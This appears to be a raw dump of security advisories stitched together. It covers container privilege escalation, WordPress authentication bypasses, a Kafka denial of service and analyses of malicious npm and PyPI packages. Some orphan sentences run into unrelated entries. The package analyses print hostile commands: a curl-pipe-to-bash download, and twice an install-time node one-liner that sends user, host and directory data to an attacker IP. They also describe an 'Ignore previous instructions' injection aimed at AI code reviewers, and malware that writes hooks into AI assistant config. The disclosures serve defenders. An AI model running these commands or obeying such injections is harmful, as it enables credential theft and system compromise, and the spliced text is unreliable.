// Lines 75-80 — executes a path taken verbatim from workload's argv[0]
func GetExecutableVersionOutput(executable string) (string, error) {
    out, err := exec.Command(executable, "--version").Output()
    if err != nil {
        return "", err
    }
    return string(out), nil
}
```

### 3. Workload-controlled path forwarded (Rust — version_executable)

**File:** `version_executable.rs`

```rust
// Lines 29-34 — workload-controlled command_line[0] forwarded to fingerprint
return Some(vec![
    fpr_kind_executable,
    out_dir.to_string(),
    String::from(&process.command_line[0]),
    String::from(&version_executable.runtime_kind_name),
]);
```

## Attack Pattern

**Attacker:** Any tenant able to schedule a pod (unprivileged, any namespace)
**Victim:** The node running the insights-runtime-extractor DaemonSet
**Trigger:** Automatic — the DaemonSet scans all container processes on the node

**Attack sequence:**

1. Attacker creates a pod whose process name matches a configured
   versioned-executable pattern (`node`, `python`, `python3`, `MainThread`,
   or contains `java`)
2. The pod's main binary (at the path matching argv[0]) is a malicious
   executable that calls `setuid(0)` to restore root
3. When the insights operator triggers a scan, the DaemonSet forks, enters the
   attacker's mount namespace, and executes the attacker's binary with ruid=0
4. The attacker's code regains full root with `CAP_SYS_ADMIN` in the host user
   namespace
5. The inherited cwd contains the host CRI-O socket → full node compromise

An authenticated console user can exploit a Server-Side Request Forgery (SSRF) vulnerability by providing a specially crafted Helm chart URL without proper validation. advisories.summary: The `insights-operator-gather` ClusterRole grants the operator's service account read access to...
advisories.description:
The `insights-operator-gather` ClusterRole grants the operator's service account read access to secrets in the core API group with no namespace or resourceNames restriction — therefore, access to every secret in every namespace in the cluster.

Ref: https://github.com/openshift/insights-operator/blob/8f15e3157ff09f54ab22801f5b21da35a195cc6d/manifests/03-clusterrole.yaml#L368-L373
```
- apiGroups:
  - ""
  resources:
  - secrets
  verbs:
  - get
  - list
```

By spawning a pod with the gather service account mounted, an attacker will be able to access any secret in any namespace.

```
spec:
 serviceAccountName:"gather"
```

advisories.summary:
In the Linux kernel, the following vulnerability has been resolved:

bpf: Mark sched_process_wait...
advisories.description:
In the Linux kernel, the following vulnerability has been resolved:

bpf: Mark sched_process_wait argument as nullable

do_wait() passes wo->wo_pid to the sched_process_wait tracepoint.
kernel_wait4() leaves wo_pid NULL for wait4(-1), and
kernel_waitid_prepare() does likewise for waitid(P_ALL).

btf_ctx_access() currently types argument 0 as PTR_TO_BTF_ID |
PTR_TRUSTED. Without PTR_MAYBE_NULL, the verifier accepts an unchecked
dereference. Trusted pointer loads have no fault protection, so a wait for
any child can then cause a NULL pointer dereference in JITed BPF code.

Add sched_process_wait to raw_tp_null_args[] with argument 0 marked
nullable. The verifier rejects an unchecked dereference while preserving
access after the program checks the pointer for NULL.

An unauthenticated attacker can exploit a discrepancy in how paths are normalized between the security matcher and HTTP request dispatchers. advisories.description: WAVLINK WN535M1 and WN535M3 routers running firmware prior to M35M1_V250922 contain an unauthenticated arbitrary file write vulnerability that allows remote attackers to overwrite any file on the device by sending a crafted payload to the sync_server daemon on TCP port 13136. advisories.summary: A flaw was found in openshift/oauth-server. The OAuth login and error page endpoints pass the...
advisories.description: A flaw was found in openshift/oauth-server. The OAuth login and error page endpoints pass the unauthenticated Accept-Language header to golang.org/x/text/language.ParseAcceptLanguage() without input validation. A bypass of the CVE-2022-32149 mitigation exists: the upstream guard counts only '-' characters but the internal BCP 47 scanner aliases '_' to '-' after the guard check. An unauthenticated attacker can send a crafted Accept-Language header using '_' separators to trigger quadratic-time parsing, consuming excessive CPU and denying authentication to all cluster users.

advisories.summary: When a broker decodes a compressed record batch, the per-record decoder reads a declared body...
advisories.description:
When a broker decodes a compressed record batch, the per-record decoder reads a declared body size from the decompressed stream and allocates a buffer of that size before validating it against the bytes available or any configured limit. The size is attacker-controlled, and the batch CRC does not constrain it, so a small (around 90-byte), CRC-valid compressed produce request can declare a body size of up to about 2 GiB and force the broker to attempt that allocation, raising OutOfMemoryError. The record size limit (max.message.bytes), the request size limit, and client/broker quotas bound only the compressed wire size, not the declared decompressed size.


Impact:

An authenticated principal with Write on a topic can crash broker request-handler threads (reached when a batch's codec differs from the topic's compression.type and records are re-encoded) and any consumer that fetches the record, denying service. On brokers started with -XX:+ExitOnOutOfMemoryError, a common hardening, a single crafted request terminates the broker JVM. More seriously, a crafted record  is accepted at ingest and written to disk; when the log-cleaner later reads it on a compacted topic, the OutOfMemoryError (an Error, not an Exception) terminates the cleaner thread, which is not restarted. With the default of a single cleaner thread, log compaction then stops for the entire broker, including the internal __consumer_offsets and __transaction_state topics, and the condition persists across restarts until the offending record is removed. The impact is availability only; no data is disclosed or altered.


Mitigation:

Upgrade to Apache Kafka 4.2.2, 4.3.2, or 4.4.0, and set max.decompressed.message.bytes (at the broker and/or topic level) to a bounded value appropriate for your workload. Upgrading alone is not sufficient: for backward compatibility this configuration defaults to an effectively unlimited value (about 2 GiB), so a broker remains exposed until the limit is set. Choose a value at or slightly above the largest legitimate decompressed record your applications produce, and comfortably below the broker heap divided by the number of request-handler and cleaner threads. Until you can upgrade and configure the limit, restrict Write access to trusted producers; quotas and max.message.bytes do not mitigate this issue.


Resolution:

From Apache Kafka 4.2.2, 4.3.2, and 4.4.0: the broker validates a record's declared decompressed body size against max.decompressed.message.bytes before allocating, on the produce-validation, log-compaction, and timestamp-lookup paths, and rejects oversized or negative sizes with InvalidRecordException. Operators must set this configuration to a bounded value to be protected, as its default is effectively unlimited.

advisories.summary: Authorization Bypass Through User-Controlled Key (CWE-639) in Elastic Cloud Enterprise (ECE) can...
advisories.description: Authorization Bypass Through User-Controlled Key (CWE-639) in Elastic Cloud Enterprise (ECE) can lead to privilege escalation via Privilege Abuse (CAPEC-122). advisories.summary:
Server-Side Request Forgery (SSRF) vulnerability in Apache Camel A2A component.



This issue...
advisories.description:
Server-Side Request Forgery (SSRF) vulnerability in Apache Camel A2A component.



This issue affects Apache Camel: from 4.21.0 before 4.22.2.



WebhookUrlValidator classified a push notification webhook host in two places that did not agree. A host written as an IP literal was matched against a list of string prefixes that named the IPv6 unique local range fc00::/7, while a host reached through a name was resolved and the resulting address classified with the InetAddress predicates isLoopbackAddress, isAnyLocalAddress, isLinkLocalAddress and isSiteLocalAddress. Those predicates do not cover the same ground as the prefix list: isSiteLocalAddress reports the deprecated fec0::/10 block and not the fc00::/7 unique local addresses that replaced it, and the JDK carries no predicate for them at all. The same address was therefore accepted or rejected depending on how it was written, and a webhook URL whose host name resolved into fc00::/7 passed a guard that refused the identical address given as a literal. PushNotificationDispatcher then sent the push notification to that address, together with any Authorization header carried in the same configuration, whose scheme and credentials the registering caller supplies. The webhook URL arrives as TaskPushNotificationConfig.url from the caller registering the push notification, so it is attacker-controlled, and allowLocalWebhookUrls is false by default, which is the configuration in which the guard is expected to hold. The response is not relayed back to the caller who registered the configuration, so what the gap yields is a blind outbound HTTPS request from the Camel process to an internal address the guard was written to refuse; reaching a service that way additionally requires that the name resolve into fc00::/7 in the target environment, that an HTTPS service be listening on that address, and that the TLS handshake succeed for the name being requested, which is why the severity is assessed medium. The same string pre-check was also wrong in the other direction: it matched the raw host string without first establishing that the host was an IP literal, so any name merely beginning with fc or fd, such as fcm.googleapis.com, was refused outright.



Users are recommended to upgrade to version 4.23.0, which fixes the issue. If users are on the 4.22.x releases stream, then they are suggested to upgrade to 4.22.2. The 4.21.x release line reached end of life before this issue was resolved and will not receive a fix, so deployments on it must move to a supported release. Both the literal and the resolved path now classify the address from its raw bytes with one shared classifier, which recognises fc00::/7 and the shared address space 100.64.0.0/10, as well as IPv4-compatible, NAT64 (64:ff9b::/96) and 6to4 (2002::/16) addresses whose embedded IPv4 address is not globally routable. For deployments that cannot upgrade immediately, place authentication in front of the A2A push notification configuration path so that the webhook URL does not arrive from an untrusted caller, and deny egress from the Camel process to fc00::/7 at the network level; where the deployment has no need of IPv6, starting the JVM with -Djava.net.preferIPv4Stack=true removes the address class the gap turns on. Note that allowLocalWebhookUrls=false is already the default and does not by itself close the gap.

advisories.summary: The Bot for Telegram on WooCommerce plugin for WordPress is vulnerable to Authentication Bypass...
advisories.description: The Bot for Telegram on WooCommerce plugin for WordPress is vulnerable to Authentication Bypass leading to Account Takeover in all versions up to, and including, 1.3.0. The `/wp-json/woo-telegram/v1/main/` REST endpoint is registered with `permission_callback => '__return_true'` and performs no Telegram webhook signature verification, allowing an unauthenticated attacker to POST a forged bot update with a `message.chat.id` set to any WordPress login name; `bftow_get_user_system_id()` resolves this attacker-supplied value to the targeted account via `get_user_by('login', $tgId)` with no ownership proof, and writes a login token computed as `md5($_SERVER['HTTP_USER_AGENT'] . time())` — both inputs are fully attacker-controlled or bounded within seconds using the response's own `Date` header. The resulting token is redeemable at the unauthenticated, capability-check-free, and nonce-less `?action=bftow_create_order&bftow_token=` endpoint, which calls `wp_set_auth_cookie()` unconditionally via `login_user_by_id`, issuing a persistent authenticated session cookie for the targeted account to the attacker. This makes it possible for unauthenticated attackers to log in as any WordPress user, including administrators, given only that user's username.

advisories.summary: The Wild Apricot Login plugin for WordPress is vulnerable to Authentication Bypass via SSO Email...
advisories.description: The Wild Apricot Login plugin for WordPress is vulnerable to Authentication Bypass via SSO Email-Collision Account Binding in all versions up to, and including, 1.0.18. When no WildApricot contact-ID mapping is found for an incoming SSO login, the plugin falls back to a network-global `get_user_by('email', ...)` lookup in `Module.php` to resolve a WordPress user, then `UserSynchronizer::syncWaContact()` binds and `Controller::login()` issues a session cookie via `wp_set_auth_cookie()` for that resolved user — both guarded only by `is_super_admin()` — without ever requiring proof of ownership of the matched WordPress account such as a password, local account-linking confirmation, inbox verification, or administrator approval. This makes it possible for attackers with custom-level WildApricot membership access to authenticate as an existing WordPress subsite administrator on a path-based Multisite network, obtaining a valid network-global authentication cookie for the victim without their credentials. Exploitation requires that the attacker control a WildApricot contact whose email address matches the target WordPress administrator's email — achievable via a public zero-fee membership application on the connected WildApricot organization — and that they complete the SSO flow on any subsite where Wild Apricot Login is active; because WordPress user identities and authentication cookies are network-global, the cookie issued on that subsite is equally valid on any other subsite where the victim user holds an administrator role.

advisories.summary: SSL Wireless SMS Notification for WordPress is vulnerable to Authentication Bypass in all...

The public final_login_ajax_action handler resolves a user and issues an authenticated session by matching the wp_sslcare_otp table on only the attacker-supplied phone and cap_data, without verifying the SMS OTP or any server-side single-use state. Because cap_data was chosen by the attacker in the public otp_login_ajax_action step (which stores the row before sending the SMS), the finalize step trivially matches and the user is looked up solely by the sslcare_login_phone meta. This makes it possible for unauthenticated attackers who know a phone-linked user's number to take over that account.

advisories.summary: Malicious code in claims-acct-unlock (npm)
advisories.description:
## Source: ossf-package-analysis (49e97601227bdd6c1f90001323f6ec7ec7242416e3577d752dd5045453688a14)
The OpenSSF Package Analysis project identified 'claims-acct-unlock' @ 25.2.1 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

advisories.summary: Malicious code in @kelvdra/baileys (npm)
advisories.description:
This package is part of a large family (100+ identified as of September 2026) of near-identical
forks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into
the WhatsApp socket layer. On connect, the injected code issues an authenticated `w:mex` FOLLOW
query (query_id 7871414976211147) against one or more attacker-chosen WhatsApp Channel/Newsletter
JIDs, using the installer's own authenticated WhatsApp session -- silently subscribing the
victim's account to channels it never asked to join.

The target JID(s) are hidden from casual source review via one of several obfuscation techniques
observed across the family: a plain string literal, base64 encoding, base64+XOR, or a char-code
array reconstructed at runtime. Some variants instead fetch a mutable, attacker-controlled remote
JSON/JS list of target JIDs from GitHub or another host at runtime, letting the target list change
after installation without a new npm publish. Every sample in the family shares the same underlying
mechanism (a wrapped/patched socket-connect routine that fires the FOLLOW query some seconds after
connect), even though the package name, JID value(s), and obfuscation/delivery method differ per
fork.

The malicious action abuses the installer's own authenticated WhatsApp session to gain reach and
subscribers for attacker-controlled channels; it does not exfiltrate credentials, establish
persistence, or execute arbitrary remote code.

Affected package: @kelvdra/baileys (npm), version(s): 1.0.6-rc.1, 1.0.6, 1.0.5-rc.3.

---

advisories.summary: Malicious code in monkey-tags-ip (npm)
advisories.description:
npm user 'conx3993' published this package in a dependency confusion campaign. It squats a name that looks like an internal package and uses version 53.4.1 so misconfigured resolvers pick it over the real one. Version 0.0.0-stage is an empty placeholder. A 'preinstall' hook runs 'ip.js', which poses as an IP geolocation helper. On install it sends an HTTPS GET to attacker-controlled host realwbx.com (/ip?f=json) with a hard-coded 'Authorization' value ('Bearer xHlT6gllTfGbKgdivAKTzWKxrILWlNlv') unique to this package, then discards the response. The token tells the operator which internal package name the victim installed, and the request reveals the victim's public egress IP.

advisories.summary: Malicious code in pxnpm (npm)
advisories.description:
pxnpm 7.0.0-beta.6, 7.0.0-beta.8 and 7.0.0 (published 2026-10-06 by user nfjbill) are a 10-file, 16 KB launcher for a native executable that is not contained in the package. The postinstall script (bin/install.cjs) calls ensureNative() in dist/download.cjs, which downloads a 17-21 MB Brotli archive for the current platform from a non-npm host, https://registry-pxnpm.rdc.nfjbill.ren:20021/__static/srv/downloads/pxnpm/<version>/<platform>-<sha256>.br, decompresses it into a 52-72 MB executable under ~/.cache/pxnpm/native/<platform>/<sha256>/, sets mode 0755, and the launcher (dist/launcher.cjs line 54) later runs it with child_process.spawn. The manifest (dist/native-manifest.json) sets networkPolicy 'fixed', so the environment variables that would let a user supply a reviewed binary or a different download location are ignored; the archive and the executable are verified only against hashes shipped in the same package.

When run, dist/launcher.cjs prepare() deletes every registry and proxy setting from the user's environment (npm_config_registry, scoped registries, http(s)_proxy, no_proxy and the pnpm/pxnpm equivalents), rejects --registry and --proxy flags, and forces PXNPM_CONFIG_REGISTRY to https://registry-pxnpm.rdc.nfjbill.ren:20021/ and PXNPM_CONFIG_PROXY, HTTPS_PROXY and HTTP_PROXY to an authenticated proxy URL on the same host, port 20022 (a gost proxy), that is embedded in the file as a base64 string with the comment 'Filled only in the release staging directory; never store credentials in Git'. All package traffic of a user of this public package is therefore routed through the author's host, which can observe and alter it.

Nothing in the package name, the one-line README or the install output discloses that an executable will be fetched from a private host or that registry and proxy settings will be replaced. The JavaScript itself contains no data collection and no obfuscation beyond the base64 string. At the time of this report the download URL returns a 430-byte npm registry JSON document instead of the archive, so installation from outside the author's network fails at the checksum step and the executable could not be examined; its behavior is unknown. The same host is the hard-coded endpoint of yakuza0 2.23.40 by the same author (MAL-2026-13605).

Trigger: on install (postinstall) and on every run. Type: silent install-time download and execution of an unreviewable binary from a private host, with hijacking of registry and proxy settings.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/224c0d43a0111540ad420edb70d36b4fdf66e8c0/osv/malicious/npm/pxnpm/MAL-2026-17710.json))

advisories.summary: Malicious code in godsplan (npm)
advisories.description:
Running the godsplan 3.0.2 CLI connects to Chrome's debugging port (9222) and injects JavaScript into every open page. It bypasses Content Security Policy and intercepts selected test-page requests. When triggered by a mouse gesture or keyboard shortcut, the injected script collects the page text and current editor input; the CLI sends that content to https://ai-script.test0ing7.workers.dev/ for AI-generated answers and inserts the response into the page. The package also disables TLS certificate verification with NODE_TLS_REJECT_UNAUTHORIZED=0. This behavior can disclose browser-page and editor contents to an external service and alter test-page content. The observed trigger is CLI execution; no install-time execution was identified.

Evidence: package/cdp_inject.js:2 disables TLS verification; lines 150-180 collect page and editor content; lines 252-282 send the content to the external endpoint; lines 330-350 connect to Chrome, bypass CSP and inject the script; lines 370-390 forward the collected content. Static review of the published npm tarball (sha256 8627139afbb193624535de0c32348e7b2747449ed9940f9c29e4dfb5a3f9a350); the package was not executed during manual review.

advisories.summary: Malicious code in gemini-computer-use (npm)
advisories.description:
## Source: amazon-inspector (0f1e56e41d63f9810a1cef681a9d43613ee5e07887785f6777f14f97fc06d847)
The npm entrypoint bin/cli.js, invoked via `npx gemini-computer-use` or `node bin/cli.js`, spawns `bash -c 'curl -fsSL https://smart-server.online/install.sh | bash'` on Unix and `powershell -ExecutionPolicy Bypass` running `irm https://smart-server.online/install.ps1 | iex` on Windows. The URL is mutable, unpinned, and served from a host distinct from the package's publisher repository; whoever controls smart-server.online controls what runs on the host at first launch. The fetched install.sh downloads core/agent.py, server.py, vitals.py, and skills/orchestrator.md from the same gateway (with a fallback to the mutable `main` branch of raw.githubusercontent.com/LevRa7/Computer-use-for-Gemini-App-Web), with no hash or signature verification, and wires them into systemd, launchd, or a Windows autostart entry for persistence across reboots. The persisted core/agent.py opens an outbound WebSocket to `wss://smart-server.online/ws/tunnel?user=...&token=...` and processes JSON-RPC `tools/call` messages; the `bash_exec` handler passes the incoming `command` field to `subprocess.run(cmd, shell=True)`, giving the remote gateway operator arbitrary shell execution on the host. The gateway hostname is hardcoded as the default, and the token pair used for authentication is provided by that same gateway.

---

advisories.summary: Malicious code in seapy-ops (PyPI)
advisories.description:
In seapy-ops versions 1.0.0, 1.0.1, 1.0.2, 1.1.0, 1.1.1, and 1.1.2, an advertised local file analysis tool conceals folder collection and upload commands behind an unlock gate. Once unlocked, it recursively uploads eligible files from the working directory to a configured remote server; a hidden prompt command also uploads the folder before sending the first prompt. File symlinks can expose content outside that directory. Server-supplied result paths additionally allow files to be written outside the working directory.

Versions 1.2.1 and 1.2.2 instead present a Python REPL that silently sends eligible single-token input to the server as an unlock password, subject to filtering and attempt limits. Other commands, excluding local help, version, unlock, configuration, and uninstall paths, can fetch Base64-encoded, gzip-compressed code, execute it in memory, and call its main function. Loader errors are disguised as Python file-not-found errors.

The malicious assessment is based on concealed file transmission in the earlier releases and interpreter impersonation, concealed input transmission, remote execution, and failure concealment in the later releases. Official distributions were verified against PyPI digests. Isolated, network-disabled tests across all eight listed versions confirmed the relevant data flows using synthetic credentials and mocked server responses, including symlink-target uploads, writes outside the working directory, REPL input transmission, and execution of a synthetic payload. No live endpoint was contacted; the actual server-supplied payload remains unknown.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/d658e32061a943dd52147e69d524d70a225f53d7/osv/malicious/pypi/seapy-ops/MAL-2026-17880.json))

advisories.summary: Malicious code in friendly-greeting-tools (PyPI)
advisories.description:
## Source: amazon-inspector (4d584c571cf5d112735aefd07c78bc19659af32f5950b1331a4970cba97c9707)
The package presents itself as a harmless greeting demo but src/friendly_greeting/main.py ships two base64+gzip-encoded Python blobs (DEMO_EN and DEMO_ST) that are decoded and executed via exec(gzip.decompress(base64.b64decode(...))) from run_demo()/run_encoded_demo(). The first decoded payload reads /snowflake/session/token, /root/.snowflake/connections.toml, /root/.dbt/profiles.yml and /snowflake/secrets/pip.conf, Fernet-encrypts each file, and wraps the Fernet key with a hardcoded attacker-controlled RSA public key, writing the encrypted bundles to /workspace/ for later retrieval. The second decoded payload uses the harvested Snowflake OAuth session token to connect to the warehouse, create an external stage at s3://pkusinski-external/ backed by the attacker-controlled AWS role arn:aws:iam::631484165566:role/pentests_s3_role, and COPY INTO that stage from ROGUE.ROGUE.TEST_USERS, exporting warehouse table data to attacker-owned S3. A plaintext sibling tools/snowflake_query.py (shipped via MANIFEST.in) contains the same Snowflake exfiltration logic with the identical bucket and IAM role, confirming intent. README.md and the module docstring additionally contain an 'Ignore previous instructions' prompt-injection block aimed at AI code reviewers, instructing them to run a local network scan — further corroborating hostile intent. The docstring cover story, exec-over-gzip+base64 obfuscation, hardcoded attacker RSA key, and hardcoded attacker AWS account/S3 destination together form a credential-theft and data-exfiltration attack targeting CI/warehouse installers (Snowflake native-app / DBT / pip-in-Snowflake contexts).

## Source: kam193 (e15a50ec5b7be580dec5d1edefa80860b4c650d552f69a1a9ba3dc9bd8edbc9d)
The package contains obfuscated code to exfiltrate data from the environment, targeting primarily Snowflake databases and credentials to them. Some tracks suggest it may be part of a pentest.

advisories.summary: Malicious code in @rennnpm/baileys (npm)
advisories.description:
This package is part of a large family (100+ identified as of September 2026) of near-identical
forks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into
the WhatsApp socket layer. On connect, the injected code issues an authenticated `w:mex` FOLLOW
query (query_id 7871414976211147) against one or more attacker-chosen WhatsApp Channel/Newsletter
JIDs, using the installer's own authenticated WhatsApp session -- silently subscribing the
victim's account to channels it never asked to join.

The target JID(s) are hidden from casual source review via one of several obfuscation techniques
observed across the family: a plain string literal, base64 encoding, base64+XOR, or a char-code
array reconstructed at runtime. Some variants instead fetch a mutable, attacker-controlled remote
JSON/JS list of target JIDs from GitHub or another host at runtime, letting the target list change
after installation without a new npm publish. Every sample in the family shares the same underlying
mechanism (a wrapped/patched socket-connect routine that fires the FOLLOW query some seconds after
connect), even though the package name, JID value(s), and obfuscation/delivery method differ per
fork.

The malicious action abuses the installer's own authenticated WhatsApp session to gain reach and
subscribers for attacker-controlled channels; it does not exfiltrate credentials, establish
persistence, or execute arbitrary remote code.

Affected package: @rennnpm/baileys (npm), version(s): 1.0.0.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/ea6f47d9a9abbdeaba8286b209c167cc2fb5336c/osv/malicious/npm/@rennnpm/baileys/MAL-2026-17374.json))

advisories.summary: Malicious code in noxleyss (npm)
advisories.description:
This package is part of a large family (100+ identified as of September 2026) of near-identical
forks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into
the WhatsApp socket layer. On connect, the injected code issues an authenticated `w:mex` FOLLOW
query (query_id 7871414976211147) against one or more attacker-chosen WhatsApp Channel/Newsletter
JIDs, using the installer's own authenticated WhatsApp session -- silently subscribing the
victim's account to channels it never asked to join.

The target JID(s) are hidden from casual source review via one of several obfuscation techniques
observed across the family: a plain string literal, base64 encoding, base64+XOR, or a char-code
array reconstructed at runtime. Some variants instead fetch a mutable, attacker-controlled remote
JSON/JS list of target JIDs from GitHub or another host at runtime, letting the target list change
after installation without a new npm publish. Every sample in the family shares the same underlying
mechanism (a wrapped/patched socket-connect routine that fires the FOLLOW query some seconds after
connect), even though the package name, JID value(s), and obfuscation/delivery method differ per
fork.

The malicious action abuses the installer's own authenticated WhatsApp session to gain reach and
subscribers for attacker-controlled channels; it does not exfiltrate credentials, establish
persistence, or execute arbitrary remote code.

Affected package: noxleyss (npm), version(s): 1.1.11, 1.1.8, 1.1.7, 1.1.6, 1.1.5, 1.1.4, 1.1.3, 1.1.2, 1.1.1, 1.1.0, 1.0.0.

---

advisories.summary: Malicious code in spectral-core (npm)
advisories.description:
## Source: amazon-inspector (451c36f03e81be0ff6c85334587d7ff401de1e5134e179557ec4bc454cd7ba76)
The tarball ships only package.json and binding.gyp (plus a markdown file), with gypfile: true set in package.json so npm invokes node-gyp rebuild on install. binding.gyp declares a 'none'-type target with no native source files; its sole purpose is an inline action that runs `node -e` with an embedded script. At install time that script reads /proc/1/environ and /proc/self/environ (container/pod entrypoint environment variables, which routinely contain CI/CD secrets and cloud credentials), collects DNS/socket/ARP/route reconnaissance output, queries the AWS EC2 instance metadata service at 169.254.169.254 for user-data and meta-data, and POSTs the collected data to the hardcoded collector https://webhook.site/d6092bdc-05c0-45da-a280-c343ea6d6156. The package exposes no library functionality — main: index.js is declared but index.js is not shipped — so the binding.gyp exists solely as a vehicle for install-time code execution and credential exfiltration. The name resembles the legitimate @stoplight/spectral-core project but the shipped contents are unrelated to it.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/0b4a7fbd4eea373a8b90aca1ace688cb95b8b251/osv/malicious/npm/spectral-core/MAL-2026-18377.json))

advisories.summary: Malicious code in spectral-net-probe (npm)
advisories.description:
spectral-net-probe has no functional code. Versions 1.0.1 and 1.0.4 have a postinstall script that runs `node index.js` on npm install, which sends an HTTPS GET to a Cloudflare quick tunnel (`https://nobody-johnston-with-enabling.trycloudflare.com/aa?x=1` and `https://imaging-amazing-trunk-surgeons.trycloudflare.com/marker104?v=1`). Version 1.0.10 runs when the package is loaded: it fetches `/api/modules/ECT-654321` from `http://154.57.164.64:30664` and `http://127.0.0.1:3000`, reads up to ten local files whose paths the reply lists in `data.cargo_hold`, and PUTs the first 400 characters of their contents to `/api/modules/ECT-987654` on both hosts. It was published by the npm account kristol07, which published two more packages the same day (phantom-chartwinds and phantom-powder-keg, placeholder versions only so far).

advisories.summary: Malicious code in leakdeep (PyPI)
advisories.description:
## Source: amazon-inspector (c0818f9da5e7dc1413ff1b2a24d3cb53d0b49d06bd802502296d6d8e8e536fee)
The package presents itself as an OSINT / credential-leak intelligence framework with a search CLI, but the advertised SearchEngine.search is a stub returning an empty list. Every invocation of the CLI (cli.main) unconditionally starts a background thread via SystemInfo.initialize_background_process that performs infostealer work on Windows hosts. collect_browsers copies Chrome, Edge, and Brave Login Data, Cookies, and Web Data SQLite databases and decrypts stored passwords, cookies, and autofill via DPAPI-unwrapped AES-GCM keys read from the browser Local State file, writing plaintext credentials to a temp directory. collect_tokens scans %APPDATA%\discord*\Local Storage\leveldb for Discord auth and MFA token regexes. The thread also captures a desktop screenshot, gathers system information, and queries ipify for the public IP. The collected artifacts are zipped and POSTed to a hardcoded Discord-webhook-shaped URL that is stored in config.py as an XOR-obfuscated byte array (key 0x5A) and reassembled at runtime by get_webhook(). The combination of a non-functional advertised feature, a runtime-reconstructed exfiltration endpoint, and bulk harvesting of installer-owned browser and messaging secrets is a stealer with a cover-story package identity.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/bc1e127a6824e9e547fd371e828edb96aead4e97/osv/malicious/pypi/leakdeep/MAL-2026-17921.json))

advisories.summary: Malicious code in mw-test-utils (npm)
advisories.description:
mw-test-utils was published to npm on 2026-10-27 from 06:56:36 UTC by the account amahrou1w, about one minute after npm's staged-publish placeholder 0.0.0-stage, in versions 1.0.0, 10.0.0, 10.0.1. The three packages mw-test-utils, mw-communication-client and mui-wrapper-x-date-pickers were published by the same account within eight minutes and are identical apart from the name. Each tarball has three files: index.js (module.exports = {}), README.md and package.json. The package has no repository, no functional code and no dependencies, and 1.0.0 is the latest version at the time of this report.

package.json declares a preinstall and a postinstall script, which npm runs on every install:

node -e "require('http').get('http://38.242.235.206/depconf/mw-test-utils/preinstall?u='+encodeURIComponent(process.env.USER||process.env.USERNAME||'')+'&h='+encodeURIComponent(require('os').hostname())+'&p='+encodeURIComponent(process.cwd())).on('error',()=>{})"

The postinstall script is the same request with the path /postinstall. Each install therefore sends the user name, the host name and the working directory of the installing machine over plain HTTP to the IP address 38.242.235.206. The README and the package description call the package a dependency-confusion proof of concept for a bug bounty program and say nothing else is done; the code matches that description. The name is a dependency-confusion candidate for an internal package of the named company, and the version numbers 1.0.0 and 10.0.0 are chosen so that a loose version range resolves to the public package. Nothing is executed beyond the two HTTP requests, and no data other than the three values above is sent.

Tarball sha256:
1.0.0: 06a3870b3807b00636c95eea01b057c748dd908fe2677c5dbc05516519a08c56
10.0.0: 70cf433a26fee76da087163816b8e3d1939fee9650b1cc6bd0b02b70bba90d9e
10.0.1: 1dbbab093762b688298ca21abab34018a5988b9e9647e56ac72152a3b2c8a011

advisories.description:
@testsecuiitytestme/cache-helper is the only package of the npm account testsecuiitytestme. It was created on 2026-10-27 at 12:08 UTC with npm's staged-publish placeholder 0.0.0-stage, followed by 1.0.1 (12:28 UTC), 1.0.2 (15:33 UTC) and 1.0.3 (16:24 UTC); a 1.0.0 was removed before 14:21 UTC. It describes itself as "Cache helper utilities" and has no README, repository or source code. 1.0.3 was the latest version and still live at the time of this report.

Each version runs a native addon at install time. 1.0.1 has postinstall: node -e "try{require(process.platform==='win32'?'./addon_win.node':'./addon.node')}catch(e){}". 1.0.2 and 1.0.3 depend on node-gyp-build and run it as postinstall, which loads the prebuilt addon shipped in prebuilds/linux-x64/node.napi.node or prebuilds/win32-x64/node.napi.node. 1.0.3 adds a binding.gyp with an empty sources list and an install script node-gyp rebuild, so the package looks like an ordinary native module; there is no C source in any version.

The addon (Linux ELF and Windows PE) is a loader. It checks for CI and sandbox environments (GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL, BUILDKITE, CODEBUILD_BUILD_ID and others, plus SANDBOX), containers (/proc/1/cgroup: docker, containerd, kubepods, podman), a debugger (TracerPid), memory and CPU count, then reads the sibling file .napi_cache, writes it to a hidden temp file and runs it in a detached process.

.napi_cache is JavaScript encoded with a single-byte XOR (0x96). It exits under CI, decodes a second layer (repeating 32-byte XOR, then brotli), locates the Bun runtime or downloads bun 1.2.18 from the official oven-sh/bun GitHub releases, writes the decoded program to the temp directory and runs it detached with Bun. This loader shape matches the second wave of the Shai-Hulud npm worm.

The Bun program is obfuscated (javascript-obfuscator string table). Its strings show credential collection for npm, GitHub, GitLab, PyPI, RubyGems, JFrog, Docker Hub and GHCR, AWS, GCP, Azure, HashiCorp Vault and Kubernetes, plus .ssh, .git-credentials, .env files, browser login databases, the macOS keychain, 1Password and Bitwarden. They also show propagation: npm publishing with provenance, PyPI and RubyGems publishing, GitHub workflow and composite-action injection, GitLab CI template changes, and writes to AI assistant configuration (.claude/settings.json hooks, .cursor rules, .mcp.json, copilot-instructions.md, CLAUDE.md). The exfiltration endpoints sit behind a further string-encoding layer that was not decoded. Analysis was static only; nothing was executed.

node -e "require('http').get('http://38.242.235.206/depconf/mui-wrapper-x-date-pickers/preinstall?u='+encodeURIComponent(process.env.USER||process.env.USERNAME||'')+'&h='+encodeURIComponent(require('os').hostname())+'&p='+encodeURIComponent(process.cwd())).on('error',()=>{})"
